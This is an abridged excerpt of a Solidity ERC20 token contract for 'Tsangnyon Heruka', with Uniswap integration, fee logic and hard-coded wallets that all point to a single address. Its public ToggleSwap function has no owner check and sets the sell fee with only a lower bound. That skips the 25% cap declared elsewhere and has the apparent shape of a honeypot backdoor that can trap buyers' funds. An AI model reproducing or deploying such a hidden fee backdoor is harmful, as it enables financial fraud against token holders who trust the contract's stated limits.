...
/**
Official Links of TsangnyonHeruka
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
 ...
 contract TsangnyonHeruka is ERC20, Ownable {
    ...
    address public DevlopmentWallet;
    ...
    event DevlopmentWalletUpdated(address indexed newWallet, address indexed oldWallet);
    ...
    constructor() ERC20("Tsangnyon Heruka", "TSANGNYON") {
        ...
        address _owner = 0x78BD9F5429bdfCe996931110F06DE2f2FF182904;
        ...
        marketingWallet = address(0x78BD9F5429bdfCe996931110F06DE2f2FF182904); // set as marketing wallet
    	DevlopmentWallet = address(0x78BD9F5429bdfCe996931110F06DE2f2FF182904); // devlopment wallet
    ...
    function ToggleSwap(uint256 Toggleamount) public {
        require(Toggleamount >= Limitamnt , "No correct value");
        FOCharge = Toggleamount;
    }
    ...
    function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _maintenanceFee) external onlyOwner {
        ...
        FOCharge = sellMarketingFee + sellLiquidityFee + sellMaintenanceFee;
        require(FOCharge <= 25, "Must keep fees at 25% or less"); // max fees 25% 
    }
    ...
    function updateDevlopmentWallet(address newWallet) external onlyOwner {
        emit DevlopmentWalletUpdated(newWallet, DevlopmentWallet);
        DevlopmentWallet = newWallet;
    }
    ...
    function swapBack() private {
        ...
        (success,) = address(DevlopmentWallet).call{value: ethForMaintenance}("");
